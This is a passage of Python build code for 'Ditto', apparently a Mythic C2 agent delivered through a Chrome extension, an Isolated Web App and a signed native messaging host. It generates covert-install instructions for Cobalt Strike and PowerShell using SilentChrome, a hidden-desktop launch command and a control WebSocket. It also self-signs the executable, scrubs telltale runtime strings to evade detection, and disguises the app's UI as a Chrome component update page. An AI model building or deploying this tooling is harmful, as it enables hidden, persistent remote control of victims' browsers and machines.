    if old_app_name and new_app_name and old_app_name != new_app_name:
        patched, replaced = _replace_all_length_delimited_values(
            patched,
            old_app_name.encode("utf-8"),
            new_app_name.encode("utf-8"),
        )
        if replaced == 0:
            raise ValueError("IWA app name was not found in protobuf template")

    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_bytes(patched)


def _write_iwa_manifest_name(iwa_dir: Path, display_name: str) -> None:
    manifest_path = iwa_dir / "public" / ".well-known" / "manifest.webmanifest"
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    manifest["name"] = display_name
    manifest["short_name"] = display_name
    manifest_path.write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")


def _find_npm() -> str:
    npm = shutil.which("npm")
    if npm:
        return npm

    for candidate in (
        r"C:\Program Files\nodejs\npm.cmd",
        r"C:\Program Files (x86)\nodejs\npm.cmd",
    ):
        if Path(candidate).exists():
            return candidate

    raise RuntimeError("npm was not found; install Node.js 22+ or add npm to PATH")


def _tail_text(lines: list[str], limit: int = 10) -> str:
    text = "".join(lines[-limit:]).strip()
    if len(text) > 4000:
        text = text[-4000:]
    return text


def _run_checked(
    command: list[str],
    cwd: Path,
    extra_env: dict | None = None,
    progress=None,
    progress_step: str = "",
    progress_label: str = "",
    progress_interval: int = 15,
) -> str:
    shell_command = os.name == "nt" and command[0].lower().endswith((".cmd", ".bat"))
    env = os.environ.copy()
    if extra_env:
        env.update({key: str(value) for key, value in extra_env.items()})
    command_dir = str(Path(command[0]).parent)
    if command_dir and Path(command[0]).exists():
        env["PATH"] = command_dir + os.pathsep + env.get("PATH", "")

    label = progress_label or subprocess.list2cmdline(command)
    if progress and progress_step:
        progress(progress_step, f"In progress: starting {label}.")

    proc = subprocess.Popen(
        subprocess.list2cmdline(command) if shell_command else command,
        cwd=str(cwd),
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        shell=shell_command,
        env=env,
    )

    output_queue: queue.Queue[str] = queue.Queue()

    def read_output() -> None:
        if proc.stdout is None:
            return
        for line in iter(proc.stdout.readline, ""):
            output_queue.put(line)
        proc.stdout.close()

    reader = threading.Thread(target=read_output, daemon=True)
    reader.start()

    output_lines: list[str] = []
    started_at = time.monotonic()
    last_emit = started_at
    while proc.poll() is None:
        try:
            while True:
                output_lines.append(output_queue.get_nowait())
        except queue.Empty:
            pass

        now = time.monotonic()
        if progress and progress_step and now - last_emit >= max(5, int(progress_interval)):
            elapsed = int(now - started_at)
            tail = _tail_text(output_lines)
            message = f"In progress: {label} has been running for {elapsed}s."
            if tail:
                message += f"\n\nRecent output:\n{tail}"
            progress(progress_step, message)
            last_emit = now
        time.sleep(0.25)

    reader.join(timeout=5)
    try:
        while True:
            output_lines.append(output_queue.get_nowait())
    except queue.Empty:
        pass

    returncode = proc.wait()
    output = "".join(output_lines)
    if returncode != 0:
        raise RuntimeError(f"{' '.join(command)} failed with exit code {returncode}\n{output}")
    if progress and progress_step:
        tail = _tail_text(output_lines)
        message = f"Completed: {label}."
        if tail:
            message += f"\n\nRecent output:\n{tail}"
        progress(progress_step, message)
    return output


def _find_tool(candidates: list[str]) -> str:
    for candidate in candidates:
        found = shutil.which(candidate)
        if found:
            return found
        if Path(candidate).exists():
            return candidate
    raise RuntimeError(f"required build tool not found: {', '.join(candidates)}")


def _run_npm(iwa_dir: Path, args: list[str], progress=None, progress_step: str = "", progress_label: str = "") -> str:
    return _run_checked(
        [_find_npm(), *args],
        iwa_dir,
        progress=progress,
        progress_step=progress_step,
        progress_label=progress_label or f"npm {' '.join(args)}",
    )


def _ensure_iwa_dependencies(iwa_dir: Path, progress=None) -> None:
    if (iwa_dir / "node_modules").exists():
        if progress:
            progress(STEP_IWA_DEPS, "Dependencies already present in copied IWA workspace.")
        return

    try:
        _run_npm(
            iwa_dir,
            ["ci", "--no-audit", "--no-fund"],
            progress=progress,
            progress_step=STEP_IWA_DEPS,
            progress_label="npm ci for IWA dependencies",
        )
    except RuntimeError:
        if progress:
            progress(STEP_IWA_DEPS, "npm ci failed; retrying with npm install.")
        _run_npm(
            iwa_dir,
            ["install", "--no-audit", "--no-fund"],
            progress=progress,
            progress_step=STEP_IWA_DEPS,
            progress_label="npm install for IWA dependencies",
        )


def _write_iwa_config(
    iwa_dir: Path,
    control_host: str,
    control_port: int,
    local_socks_enabled: bool,
    socks_host: str,
    socks_port: int,
    auto_start_socks: bool,
    bridge_extension_id: str,
    debug_ui: bool,
) -> None:
    config = (
        "const query = new URLSearchParams(location.search);\n\n"
        "export const CONFIG = Object.freeze({\n"
        f"  controlHost: {json.dumps(control_host)},\n"
        f"  controlPort: {int(control_port)},\n"
        f"  localSocksEnabled: {json.dumps(bool(local_socks_enabled))},\n"
        f"  socksHost: {json.dumps(socks_host)},\n"
        f"  socksPort: {int(socks_port)},\n"
        f"  autoStartSocks: {json.dumps(bool(local_socks_enabled and auto_start_socks))},\n"
        f"  bridgeExtensionId: query.get(\"ext\") || {json.dumps(bridge_extension_id)},\n"
        f"  debugUi: query.get(\"debug\") === \"1\" || {json.dumps(bool(debug_ui))}\n"
        "});\n"
    )
    (iwa_dir / "src" / "config.js").write_text(config, encoding="utf-8")


def _build_iwa_manifest_resources(iwa_dir: Path) -> Path:
    images_dir = iwa_dir / "public" / "images"
    resources_dir = iwa_dir / "install-artifacts" / "manifest-resources"
    if resources_dir.exists():
        shutil.rmtree(resources_dir)

    icon_sizes = [16, 32, 48, 128, 192, 512]
    for size in icon_sizes:
        source = images_dir / f"icon-{size}.png"
        if not source.exists():
            continue
        for folder in (resources_dir / "Icons", resources_dir / "Trusted Icons" / "Icons"):
            folder.mkdir(parents=True, exist_ok=True)
            shutil.copy2(source, folder / f"{size}.png")

    for size in (192, 512):
        source = images_dir / f"icons-{size}.png"
        if not source.exists():
            source = images_dir / f"icon-{size}.png"
        if source.exists():
            dest = resources_dir / "Icons Maskable"
            dest.mkdir(parents=True, exist_ok=True)
            shutil.copy2(source, dest / f"{size}.png")

    return resources_dir


def _decode_iwa_private_key_b64(value: str) -> bytes:
    encoded = "".join(str(value or "").split())
    if not encoded:
        return b""
    try:
        key_bytes = base64.b64decode(encoded, validate=True)
    except Exception as exc:
        raise ValueError("iwa_private_key_b64 must be base64-encoded PEM key bytes") from exc
    if b"-----BEGIN " not in key_bytes or b"PRIVATE KEY-----" not in key_bytes:
        raise ValueError("iwa_private_key_b64 must decode to a PEM private key")
    if not key_bytes.endswith(b"\n"):
        key_bytes += b"\n"
    return key_bytes


def _write_iwa_private_key(iwa_dir: Path, private_key_b64: str, progress=None) -> None:
    key_bytes = _decode_iwa_private_key_b64(private_key_b64)
    key_path = iwa_dir / "private-ecdsa-p256.key"
    if key_bytes:
        key_path.write_bytes(key_bytes)
        if progress:
            progress(STEP_IWA_PREPARE, "Using supplied base64 IWA signing key.")
    else:
        if key_path.exists():
            key_path.unlink()
        if progress:
            progress(STEP_IWA_PREPARE, "No IWA signing key supplied; npm generate-keys will create one.")


def _build_iwa_artifacts(
    template_path: Path,
    work_root: Path,
    control_host: str,
    control_port: int,
    local_socks_enabled: bool,
    socks_host: str,
    socks_port: int,
    auto_start_socks: bool,
    bridge_extension_id: str,
    debug_ui: bool,
    private_key_b64: str = "",
    progress=None,
) -> dict:
    iwa_dir = work_root / "ditto-iwa"
    if progress:
        progress(STEP_IWA_PREPARE, "In progress: copying IWA source into build workspace.")
    shutil.copytree(
        template_path,
        iwa_dir,
        ignore=shutil.ignore_patterns(
            "node_modules",
            "dist",
            "dist-wbn",
            "__pycache__",
            "private-ecdsa-p256.key",
        ),
    )
    display_name = DEFAULT_IWA_DEBUG_NAME if debug_ui else DEFAULT_IWA_NORMAL_NAME
    _write_iwa_manifest_name(iwa_dir, display_name)
    if progress:
        progress(STEP_IWA_PREPARE, f"Prepared IWA workspace with display name {display_name!r}.")

    if progress:
        progress(STEP_IWA_PREPARE, "In progress: writing IWA runtime configuration.")
    _write_iwa_config(
        iwa_dir,
        control_host=control_host,
        control_port=control_port,
        local_socks_enabled=local_socks_enabled,
        socks_host=socks_host,
        socks_port=socks_port,
        auto_start_socks=auto_start_socks,
        bridge_extension_id=bridge_extension_id,
        debug_ui=debug_ui,
    )
    _write_iwa_private_key(iwa_dir, private_key_b64, progress=progress)
    _ensure_iwa_dependencies(iwa_dir, progress=progress)
    _run_npm(
        iwa_dir,
        ["run", "build:wbn"],
        progress=progress,
        progress_step=STEP_IWA_BUNDLE,
        progress_label="npm run build:wbn for signed IWA bundle",
    )
    if progress:
        progress(STEP_IWA_METADATA, "In progress: copying manifest icon resources and patching WebApp protobuf.")
    manifest_resources_path = _build_iwa_manifest_resources(iwa_dir)

    bundle_info_path = iwa_dir / "install-artifacts" / "bundle-info.json"
    template_info_path = iwa_dir / "install-artifacts" / "install-info.template.json"
    template_record_path = iwa_dir / "install-artifacts" / "public-manual-webapp.pb"
    patched_record_path = iwa_dir / "install-artifacts" / "webapp.pb"
    key_distribution_path = iwa_dir / "install-artifacts" / "iwa-key-distribution.pb"

    bundle_info = json.loads(bundle_info_path.read_text(encoding="utf-8"))
    template_info = json.loads(template_info_path.read_text(encoding="utf-8"))
    _patch_iwa_webapp_record(
        template_path=template_record_path,
        output_path=patched_record_path,
        old_signature_hex=template_info["signature"],
        new_signature_hex=bundle_info["signature_hex"],
        old_web_bundle_id=template_info["web_bundle_id"],
        new_web_bundle_id=bundle_info["web_bundle_id"],
        old_public_key=template_info["public_key"],
        new_public_key=bundle_info["public_key"],
        old_app_name=template_info.get("app_name", DEFAULT_IWA_DEBUG_NAME),
        new_app_name=display_name,
    )

    iwa_origin = f"isolated-app://{bundle_info['web_bundle_id']}/"
    key_distribution_version = _iwa_key_distribution_version()
    key_distribution_pb = _build_iwa_key_distribution_pb(
        bundle_info["web_bundle_id"],
        "Browser Components",
    )
    key_distribution_path.write_bytes(key_distribution_pb)
    if progress:
        progress(
            STEP_IWA_METADATA,
            "Built install metadata "
            f"app_id={_chrome_app_id_from_iwa_origin(iwa_origin)} "
            f"bundle_id={bundle_info['web_bundle_id']}.",
        )
    install_info = {
        "app_name": display_name,
        "app_id": _chrome_app_id_from_iwa_origin(iwa_origin),
        "iwa_origin": iwa_origin,
        "iwa_folder_name": template_info.get("iwa_folder_name", DEFAULT_IWA_FOLDER_NAME),
        "web_bundle_id": bundle_info["web_bundle_id"],
        "public_key": bundle_info["public_key"],
        "signature": bundle_info["signature_hex"].upper(),
        "key_type": bundle_info["key_type"],
        "control_host": control_host,
        "control_port": control_port,
        "local_socks_enabled": bool(local_socks_enabled),
        "socks_host": socks_host,
        "socks_port": socks_port,
        "auto_start_socks": bool(local_socks_enabled and auto_start_socks),
        "bridge_extension_id": bridge_extension_id,
        "debug_ui": bool(debug_ui),
        "bundle_path": "iwa/app.swbn",
        "protobuf_path": "iwa/install-artifacts/webapp.pb",
        "iwa_key_distribution_path": "iwa/install-artifacts/iwa-key-distribution.pb",
        "manifest_resources_path": "iwa/manifest-resources",
        "iwa_key_distribution_version": key_distribution_version,
        "iwa_key_distribution_component_id": IWA_KEY_DISTRIBUTION_COMPONENT_ID,
        "template": template_info.get("template", ""),
    }
    install_info_path = iwa_dir / "install-artifacts" / "install-info.json"
    install_info_path.write_text(json.dumps(install_info, indent=2) + "\n", encoding="utf-8")

    return {
        "work_dir": iwa_dir,
        "bundle_path": iwa_dir / "dist-wbn" / "app.swbn",
        "record_path": patched_record_path,
        "key_distribution_path": key_distribution_path,
        "manifest_resources_path": manifest_resources_path,
        "bundle_info_path": bundle_info_path,
        "install_info_path": install_info_path,
        "bundle_info": bundle_info,
        "install_info": install_info,
    }


def _write_iwa_package_readme(
    package_dir: Path,
    install_info: dict,
    extension_id: str = "",
    native_host_name: str = "",
    native_host_exe_name: str = "",
) -> None:
    local_socks_note = (
        f"Debug local SOCKS listener: {install_info['socks_host']}:{install_info['socks_port']} "
        f"(auto_start={str(bool(install_info['auto_start_socks'])).lower()})"
        if install_info.get("local_socks_enabled")
        else "Debug local SOCKS listener: disabled; Mythic SOCKS uses the IWA control WebSocket."
    )
    kd_version = install_info["iwa_key_distribution_version"]
    extension_folder = extension_id or "<extension_id>"
    native_host_install = ""
    if native_host_name:
        native_host_install = f"""
Stage the native messaging host under the extension directory:
  cd "%UserData%\\%Profile%\\{extension_folder}"
  mkdir native_host
  cd native_host
  upload {native_host_exe_name or '<native_host.exe>'}

Install the native messaging host registry pointer:
  silentchrome --install-native-host --browser chrome --native-host-name {native_host_name} --native-host-manifest "C:\\Users\\<user>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\{extension_folder}\\{native_host_name}.json"
"""
    native_host_silentchrome_install = ""
    if native_host_name:
        native_host_manifest_path = (
            f"C:\\Users\\<user>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"
            f"{extension_folder}\\{native_host_name}.json"
        )
        native_host_silentchrome_install = (
            "  silentchrome --install-native-host --browser chrome "
            f"--native-host-name {native_host_name} "
            f"--native-host-manifest \"{native_host_manifest_path}\""
        )
    text = f"""Ditto IWA payload artifacts

Generated artifacts:
  extension\\manifest.json
  extension\\service_worker.js
  extension\\config.js
  extension\\{native_host_name + ".json" if native_host_name else "<native-host>.json"}
  extension\\icons\\extension_icon.png
  extension\\native_host\\{native_host_exe_name or "<native-host.exe>"}
  iwa\\app.swbn
  iwa\\install-artifacts\\webapp.pb
  iwa\\install-artifacts\\iwa-key-distribution.pb (optional fallback; SilentChrome can generate this on-target)
  iwa\\manifest-resources\\Icons\\*.png
  iwa\\manifest-resources\\Icons Maskable\\*.png
  iwa\\manifest-resources\\Trusted Icons\\Icons\\*.png

PowerShell staging example:
  $Payload = "C:\\Path\\To\\ditto"
  $UserData = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data"
  $Profile = "Default"
  $AppId = "{install_info['app_id']}"
  $IwaFolder = "{install_info['iwa_folder_name']}"
  $KdVersion = "{kd_version}"
  New-Item -ItemType Directory -Force -Path "$UserData\\$Profile\\iwa\\$IwaFolder" | Out-Null
  Copy-Item "$Payload\\iwa\\app.swbn" "$UserData\\$Profile\\iwa\\$IwaFolder\\main.swbn" -Force
  Copy-Item "$Payload\\iwa\\install-artifacts\\webapp.pb" "$UserData\\$Profile\\iwa\\$IwaFolder\\webapp.pb" -Force
  Copy-Item "$Payload\\iwa\\manifest-resources" "$UserData\\$Profile\\iwa\\$IwaFolder\\manifest-resources" -Recurse -Force
  Copy-Item "$Payload\\extension" "$UserData\\$Profile\\{extension_folder}" -Recurse -Force

Cobalt Strike staging checklist:
  1. Kill Chrome for the target profile before running the IWA install BOF.
  2. Stage IWA bundle and protobuf:
     cd C:\\Users\\<user>\\AppData\\Local\\Google\\Chrome\\User Data\\Default
     mkdir iwa
     cd iwa
     mkdir {install_info['iwa_folder_name']}
     cd {install_info['iwa_folder_name']}
     upload main.swbn
     upload webapp.pb

  3. Stage IWA manifest resources. Preserve the subdirectory names exactly:
     mkdir manifest-resources
     cd manifest-resources
     mkdir Icons
     cd Icons
     upload 16.png
     upload 32.png
     upload 48.png
     upload 128.png
     upload 192.png
     upload 512.png
     cd ..
     mkdir "Trusted Icons"
     cd "Trusted Icons"
     mkdir Icons
     cd Icons
     upload 16.png
     upload 32.png
     upload 48.png
     upload 128.png
     upload 192.png
     upload 512.png
     cd ..\\..
     mkdir "Icons Maskable"
     cd "Icons Maskable"
     upload 192.png
     upload 512.png

  4. Stage the extension outside Chrome's managed Extensions folder:
     cd C:\\Users\\<user>\\AppData\\Local\\Google\\Chrome\\User Data\\Default
     mkdir {extension_folder}
     cd {extension_folder}
     upload service_worker.js
     upload manifest.json
     upload config.js
     upload {native_host_name + ".json" if native_host_name else "<native-host>.json"}
     mkdir icons
     cd icons
     upload extension_icon.png
     cd ..
{native_host_install}
SilentChrome-BOF install commands:
  silentchrome --install-extension --browser chrome --ext-path "C:\\Users\\<user>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\{extension_folder}"

  silentchrome --install-iwa --browser chrome --user-data-dir "C:\\Users\\<user>\\AppData\\Local\\Google\\Chrome\\User Data" --profile Default --iwa-app-id {install_info['app_id']} --iwa-record "C:\\Users\\<user>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\iwa\\{install_info['iwa_folder_name']}\\webapp.pb" --iwa-bundle-path "C:\\Users\\<user>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\iwa\\{install_info['iwa_folder_name']}\\main.swbn" --iwa-manifest-resources "C:\\Users\\<user>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\iwa\\{install_info['iwa_folder_name']}\\manifest-resources" --iwa-generate-key-distribution --iwa-key-distribution-version "{kd_version}"
{native_host_silentchrome_install}

Install the staged IWA profile record with SilentChrome EXE:
  silent_chrome.exe --browser chrome --user-data-dir "$UserData" --profile "$Profile" --install-iwa --iwa-app-id "$AppId" --iwa-record "$Payload\\iwa\\install-artifacts\\webapp.pb" --iwa-bundle-path "$UserData\\$Profile\\iwa\\$IwaFolder\\main.swbn" --iwa-manifest-resources "$Payload\\iwa\\manifest-resources" --iwa-generate-key-distribution --iwa-key-distribution-version "$KdVersion" --verbose

The examples above target the normal Chrome profile location. Only replace
`$UserData` / `--user-data-dir` when deliberately testing an alternate Chrome
profile directory.

`iwa\\manifest-resources` is copied to
`$UserData\\$Profile\\Web Applications\\Manifest Resources\\$AppId`. Chromium's
Windows relaunch-details path sets the live taskbar/titlebar icon from that
icon manager cache before refreshing the generated `.ico`; omitting it can
leave the first silently launched IWA window with a blank taskbar icon.

SilentChrome always writes profile-local Preferences content settings for
local-network, loopback-network, and local-network-access during IWA installs.
This avoids HKCU policy writes for private/loopback Direct Sockets testing.

The generated webapp.pb includes Chrome's stored WebApp permissions_policy
entries for cross-origin-isolated, direct-sockets, direct-sockets-private, and
local-network. Without those entries Chrome launches the IWA but rejects
TCPServerSocket with a Permissions-Policy NotAllowedError.

SilentChrome derives the signed Web Bundle ID from webapp.pb and generates
IwaKeyDistribution\\$KdVersion\\iwa-key-distribution.pb and the required sibling
IwaKeyDistribution\\$KdVersion\\manifest.json on-target. The optional payload
iwa-key-distribution.pb already contains the same user-install allowlist entry
and can be staged manually with --iwa-register-key-distribution if desired;
SilentChrome will still create manifest.json next to it when missing.

Normal installs should not enable enable-isolated-web-app-dev-mode@1. The
production-style path uses enable-isolated-web-apps@1 plus the local
IwaKeyDistribution component, which avoids the dev-mode unsupported feature
banner.

Launch with HiddenDesktopProcess or an equivalent launcher:
  hidden_desktop_process.exe --path "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --args "--app-id={install_info['app_id']}" --hold-ms 5000 --verbose

Control WebSocket:
  ws://{install_info['control_host']}:{install_info['control_port']}

IWA visible UI:
  {"debug diagnostics page" if install_info.get("debug_ui") else "Chrome component update page"}
  Append ?debug=1 to the isolated-app URL during local testing to force the diagnostic page.

{local_socks_note}
"""
    (package_dir / "README.txt").write_text(text, encoding="utf-8")
    (package_dir / "iwa" / "README.txt").write_text(text, encoding="utf-8")


def _native_host_features(commands: list[str]) -> list[str]:
    features = []
    for command in commands:
        feature = NATIVE_HOST_COMMAND_FEATURES.get(command)
        if not feature:
            raise ValueError(f"unknown native host command feature: {command}")
        if feature not in features:
            features.append(feature)
    return sorted(features)


def _selected_native_host_commands(included_commands: list[str]) -> list[str]:
    commands = [
        command
        for command in included_commands
        if command in NATIVE_HOST_COMMAND_FEATURES
    ]
    return _dedupe_preserve_order(commands)


def _selected_native_host_required_commands(included_commands: list[str]) -> list[str]:
    return _dedupe_preserve_order([
        command
        for command in included_commands
        if command in NATIVE_HOST_REQUIRED_COMMANDS
    ])


def _selected_iwa_commands(included_commands: list[str]) -> list[str]:
    return _dedupe_preserve_order([
        command
        for command in included_commands
        if command in IWA_COMMANDS
    ])


def _validate_native_host_name(name: str) -> str:
    value = (name or "").strip() or DEFAULT_NATIVE_HOST_NAME
    if not re.fullmatch(r"[a-z0-9_.-]+", value):
        raise ValueError("native_host_name must contain only lowercase letters, digits, dot, underscore, or dash")
    return value


def _sanitize_native_identity(value: str, fallback: str) -> str:
    sanitized = re.sub(r"[\r\n/\\]+", " ", str(value or "")).strip()
    sanitized = re.sub(r"\s+", " ", sanitized).strip(" .")
    return sanitized or fallback


def _write_native_host_manifest(
    output_path: Path,
    host_name: str,
    exe_relative_path: str,
    extension_id: str,
) -> None:
    allowed_origin = (
        f"chrome-extension://{extension_id}/"
        if extension_id
        else "chrome-extension://<extension-id>/"
    )
    manifest = {
        "name": host_name,
        "description": "Native host",
        "path": exe_relative_path.replace("/", "\\"),
        "type": "stdio",
        "allowed_origins": [allowed_origin],
    }
    output_path.write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")


def _write_native_host_readme(
    output_path: Path,
    host_name: str,
    manifest_relative_path: str,
    exe_relative_path: str,
    extension_id: str,
    commands: list[str],
) -> None:
    origin_note = (
        f"Allowed extension ID: {extension_id}"
        if extension_id
        else "Allowed extension ID is a placeholder; set manifest_key or native_host_allowed_extension_id before use."
    )
    text = f"""Ditto native messaging host artifacts

Host name:
  {host_name}

Native manifest:
  {manifest_relative_path}

Native host executable:
  {exe_relative_path}

{origin_note}

Register the host by pointing Chrome to the generated JSON:
  reg add HKCU\\Software\\Google\\Chrome\\NativeMessagingHosts\\{host_name} /ve /t REG_SZ /d "<absolute path to {manifest_relative_path}>" /f

The JSON path value for the executable is relative to the extension folder:
  {exe_relative_path}

Enabled native commands:
  {", ".join(commands)}
"""
    output_path.write_text(text, encoding="utf-8")


def _sign_native_host(exe_path: Path, work_dir: Path, subject: str, product_name: str, progress=None) -> None:
    openssl = _find_tool(["openssl"])
    osslsigncode = _find_tool(["osslsigncode"])
    cert_path = work_dir / "native_host.crt"
    key_path = work_dir / "native_host.key"
    signed_path = work_dir / f"{exe_path.stem}.signed{exe_path.suffix}"
    cn = _sanitize_native_identity(subject.replace("CN=", ""), DEFAULT_NATIVE_HOST_SIGNER)
    product_name = _sanitize_native_identity(product_name, DEFAULT_NATIVE_HOST_PRODUCT)

    _run_checked([
        openssl,
        "req",
        "-x509",
        "-newkey",
        "rsa:2048",
        "-keyout",
        str(key_path),
        "-out",
        str(cert_path),
        "-days",
        "1095",
        "-nodes",
        "-subj",
        f"/CN={cn}",
    ],
        work_dir,
        progress=progress,
        progress_step=STEP_NATIVE_HOST_SIGN,
        progress_label="openssl self-signed certificate generation",
    )
    _run_checked([
        osslsigncode,
        "sign",
        "-certs",
        str(cert_path),
        "-key",
        str(key_path),
        "-n",
        product_name,
        "-in",
        str(exe_path),
        "-out",
        str(signed_path),
    ],
        work_dir,
        progress=progress,
        progress_step=STEP_NATIVE_HOST_SIGN,
        progress_label="osslsigncode native host signing",
    )
    shutil.move(str(signed_path), exe_path)


def _scrub_native_host_runtime_strings(exe_path: Path) -> int:
    def same_length(old: bytes, replacement: str) -> bytes:
        new = replacement.encode("ascii")
        if len(new) > len(old):
            raise ValueError("native host runtime scrub replacement is too long")
        return new.ljust(len(old), b" ")

    replacements = [
        (b"Mingw-w64 runtime failure:\n", "Runtime component message:\n"),
        (b"Address %p has no image-section", "Address %p region unavailable"),
        (b"  VirtualQuery failed for %d bytes at address %p", "  Memory query returned for %d bytes at addr %p"),
        (b"  VirtualProtect failed with code 0x%x", "  Memory protect returned status 0x%x"),
        (b"  Unknown pseudo relocation protocol version %d.\n", "  Runtime relocation protocol status code %d.\n"),
        (b"  Unknown pseudo relocation bit size %d.\n", "  Runtime relocation size code %d.\n"),
    ]

    data = exe_path.read_bytes()
    patched = data
    count = 0
    for old, replacement in replacements:
        new = same_length(old, replacement)
        occurrences = patched.count(old)
        if occurrences:
            patched = patched.replace(old, new)
            count += occurrences

    if patched != data:
        exe_path.write_bytes(patched)
    return count


def _build_native_host_artifacts(
    template_path: Path,
    work_root: Path,
    commands: list[str],
    key_b64: str,
    exe_name: str,
    sign: bool,
    company: str,
    product: str,
    description: str,
    signer_subject: str,
    progress=None,
) -> dict:
    native_dir = work_root / "native-host"
    if progress:
        progress(STEP_NATIVE_HOST_PREPARE, "In progress: copying native host source into build workspace.")
    shutil.copytree(
        template_path,
        native_dir,
        ignore=shutil.ignore_patterns("target", "dist", "__pycache__"),
    )

    target = DEFAULT_NATIVE_HOST_TARGET
    features = _native_host_features(commands)
    if progress:
        progress(
            STEP_NATIVE_HOST_PREPARE,
            f"Prepared native host workspace target={target} features={','.join(features)}.",
        )
    cargo = _find_tool(["cargo", "/root/.cargo/bin/cargo"])
    strip = find_optional_tool([
        "llvm-strip",
        "x86_64-w64-mingw32-strip",
        "strip",
    ])
    objcopy = find_optional_tool([
        "llvm-objcopy",
        "x86_64-w64-mingw32-objcopy",
        "objcopy",
    ])
    if not find_optional_tool(["cargo-xwin"]):
        raise RuntimeError("MSVC native host builds require cargo-xwin in PATH")
    cargo_verb = ["xwin", "build"]

    existing_rustflags = os.environ.get("RUSTFLAGS", "").strip()
    release_rustflags = "-C debuginfo=0 -C strip=symbols"
    rustflags = f"{existing_rustflags} {release_rustflags}".strip()
    env = {
        "NM_PSK_B64": key_b64,
        "NM_COMPANY": _sanitize_native_identity(company, DEFAULT_NATIVE_HOST_COMPANY),
        "NM_PRODUCT": _sanitize_native_identity(product, DEFAULT_NATIVE_HOST_PRODUCT),
        "NM_DESCRIPTION": _sanitize_native_identity(description, DEFAULT_NATIVE_HOST_DESCRIPTION),
        "NM_ORIGINAL_FILENAME": exe_name,
        "RUSTFLAGS": rustflags,
        "WINDRES": shutil.which("x86_64-w64-mingw32-windres") or "x86_64-w64-mingw32-windres",
        "CARGO_TARGET_X86_64_PC_WINDOWS_GNU_LINKER": shutil.which("x86_64-w64-mingw32-gcc") or "x86_64-w64-mingw32-gcc",
        "CARGO_TARGET_X86_64_PC_WINDOWS_GNU_AR": shutil.which("x86_64-w64-mingw32-ar") or "x86_64-w64-mingw32-ar",
    }
    _run_checked([
        cargo,
        *cargo_verb,
        "--release",
        "--target",
        target,
        "--no-default-features",
        "--features",
        ",".join(features),
    ],
        native_dir,
        extra_env=env,
        progress=progress,
        progress_step=STEP_NATIVE_HOST_COMPILE,
        progress_label=f"cargo {' '.join(cargo_verb)} native host",
    )

    built = native_dir / "target" / target / "release" / "ditto_native_host.exe"
    if not built.exists():
        raise RuntimeError("native host build did not produce ditto_native_host.exe")
    out_path = work_root / exe_name
    shutil.copy2(built, out_path)
    if progress:
        progress(STEP_NATIVE_HOST_HARDEN, "In progress: stripping, cleaning, and scrubbing native host PE.")
    hardening_report = harden_native_host(
        out_path,
        strip_tool=strip,
        objcopy_tool=objcopy,
        timestamp=int(datetime.utcnow().timestamp()),
    )
    if progress:
        progress(
            STEP_NATIVE_HOST_HARDEN,
            "Hardened native host PE "
            f"size={hardening_report.get('before_size')}->{hardening_report.get('after_size')} "
            f"scrubs={sum(hardening_report.get('scrubbed_strings', {}).values())}.",
        )
    if sign:
        if progress:
            progress(STEP_NATIVE_HOST_SIGN, "In progress: generating self-signed certificate and signing native host.")
        _sign_native_host(
            out_path,
            work_root,
            subject=signer_subject,
            product_name=product,
            progress=progress,
        )
        if progress:
            progress(STEP_NATIVE_HOST_SIGN, "Signed native host executable.")
    elif progress:
        progress(STEP_NATIVE_HOST_SIGN, "Native host signing disabled.")

    return {
        "exe_path": out_path,
        "commands": commands,
        "features": features,
        "key_b64": key_b64,
        "signed": sign,
        "target": target,
        "hardening": hardening_report,
        "runtime_scrubs": sum(hardening_report.get("scrubbed_strings", {}).values()),
    }


def _get_included_commands(payload: PayloadType) -> list[str]:
    commands = getattr(payload, "commands", None)
    if commands is None:
        return []

    try:
        return sorted(str(command).strip().lower() for command in commands.get_commands() if str(command).strip())
    except Exception:
        return []


def _dedupe_preserve_order(values: list[str]) -> list[str]:
    seen = set()
    deduped = []
    for value in values:
        if value in seen:
            continue
        seen.add(value)
        deduped.append(value)
    return deduped


def _build_manifest_permissions(base_permissions: list[str], included_commands: list[str]) -> list[str]:
    dynamic_permissions = {
        permission
        for command in included_commands
        for permission in COMMAND_MANIFEST_PERMISSIONS.get(command, [])
    }
    managed_permissions = {
        permission
        for permissions in COMMAND_MANIFEST_PERMISSIONS.values()
        for permission in permissions
    }
    permissions = [
        permission
        for permission in base_permissions
        if permission not in managed_permissions or permission in dynamic_permissions
    ]
    permissions.extend(sorted(dynamic_permissions))
    return _dedupe_preserve_order(permissions)


def _build_parameter(**kwargs):
    try:
        return BuildParameter(**kwargs)
    except TypeError as exc:
        message = str(exc)
        if "unexpected keyword argument" not in message:
            raise
        unsupported = message.split("'")[1]
        kwargs.pop(unsupported, None)
        return _build_parameter(**kwargs)


class Ditto(PayloadType):
    name = "ditto"
    file_extension = "zip"
    author = "@kingofthenops"
    supported_os = [SupportedOS.Windows]
    wrapper = False
    wrapped_payloads = []
    note = "Browser-based Mythic agent delivered through an extension."
    supports_dynamic_loading = True
    mythic_encrypts = True
    translation_container = None
    agent_type = "agent"
    agent_path = Path(__file__).parent.resolve()
    agent_icon_path = agent_path / ".." / "agent_icons" / "ditto.svg"
    agent_code_path = agent_path / "agent_code" / "extension"
    iwa_code_path = agent_path / "agent_code" / "iwa"
    native_host_code_path = agent_path / "agent_code" / "native_host"

    build_parameters = [
        _build_parameter(
            name="name",
            parameter_type=BuildParameterType.String,
            description="Extension name written into manifest.json.",
            default_value=DEFAULT_EXTENSION_NAME,
            required=False,
            group_name="Extension",
            ui_position=10,
        ),
        _build_parameter(
            name="description",
            parameter_type=BuildParameterType.String,
            description="Extension description written into manifest.json.",
            default_value=DEFAULT_EXTENSION_DESCRIPTION,
            required=False,
            group_name="Extension",
            ui_position=20,
        ),
        _build_parameter(
            name="extension_icon",
            parameter_type=BuildParameterType.File,
            description="Optional raster icon file to embed into the extension manifest.",
            default_value="",
            required=False,
